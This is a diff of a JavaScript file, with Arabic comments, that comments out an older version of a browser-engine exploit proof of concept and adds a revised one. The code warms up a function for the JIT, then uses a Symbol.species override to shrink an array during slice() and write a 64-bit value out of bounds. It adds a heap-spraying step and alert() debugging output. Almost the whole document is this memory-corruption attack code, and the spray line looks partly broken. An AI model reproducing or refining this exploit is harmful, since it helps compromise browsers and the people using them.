@@ -45,6 +45,7 @@ function main() {
 main();
 */
 
+/*
 let Trigger = false;
 let Arr = null;
 let ab = new ArrayBuffer(0x2000); // زيادة الحجم لتخزين 64-bit
@@ -87,6 +88,61 @@ function main() {
     alert(`Final Arr[0x20] = ${Arr[0x20].toString(16)}`);
     alert(`y[0] = ${y[0].toString(16)}`);
     alert(`Arr.length = ${Arr.length}`);
+}
+
+main();
+*/
+
+
+let Trigger = false;
+let Arr = null;
+let ab = new ArrayBuffer(0x2000); // زيادة الحجم
+let y = new BigUint64Array(ab); // دعم 64-bit
+
+function Target(Special, Idx, Value) {
+    try {
+        Arr.fill(4e-324); // تهيئة
+        Special.slice();
+        Arr[Idx] = Value; // كتابة القيمة
+        y[0] = BigInt(Arr[Idx]); // قراءة إلى 64-bit
+        if (Idx === 0x20 && Trigger) {
+           // alert(`Trigger hit at ${Idx.toString(16)}, y[0] = ${y[0].toString(16)}`);
+        }
+        alert(`Target called, Arr[${Idx.toString(16)}] = ${Arr[Idx].toString(16)}, y[0] = ${y[0].toString(16)}`);
+    } catch (e) {
+        alert(`Error at Idx ${Idx.toString(16)}: ${e.message}`);
+    }
+}
+
+class SoSpecial extends Array {
+    static get [Symbol.species]() {
+        return function() {
+            if (Trigger) {
+                Arr.length = 0;
+                let spray = new Array(0x1000).fill(new ArrayBuffer(0x100).fill(0xdeadc0de)); // heap spraying
+                alert("Heap sprayed with 0xdeadc0de");
+            }
+        };
+    }
+};
+
+function main() {
+    try {
+        const Snowflake = new SoSpecial();
+        Arr = new Array(0x21);
+        Arr.fill(0);
+        for (let Idx = 0; Idx < 0x400; Idx++) {
+            Target(Snowflake, 0, 5e-324);
+        }
+        Trigger = true;
+        let qwordValue = 0x44332211deadbeefn; // قيمة 64-bit
+        Target(Snowflake, 0x20, qwordValue);
+        alert(`Final Arr[0x20] = ${Arr[0x20].toString(16)}`);
+        alert(`y[0] = ${y[0].toString(16)}`);
+        alert(`Arr.length = ${Arr.length}`);
+    } catch (e) {
+        alert(`Main Error: ${e.message}`);
+    }
 }
 
 main();
